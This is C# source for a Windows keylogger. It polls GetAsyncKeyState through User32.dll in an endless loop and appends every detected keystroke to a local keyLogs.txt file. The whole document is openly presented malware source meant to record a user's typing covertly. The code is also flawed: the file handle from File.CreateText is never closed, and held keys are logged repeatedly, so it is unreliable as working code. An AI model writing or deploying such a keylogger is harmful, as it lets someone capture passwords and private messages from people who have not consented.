using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        
        static void Main(string[] args)
        { 
            string filePath = Environment.CurrentDirectory + @"\keyLogs.txt";
            File.CreateText(filePath);
            while (true)
            {
                Thread.Sleep(10);
                for (int i = 1; i <= 1279; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        using (StreamWriter streamWriter = File.AppendText(filePath))
                        {
                            streamWriter.Write((System.ConsoleKey)i);
                        }
                    }
                }
            }
        }
    }
}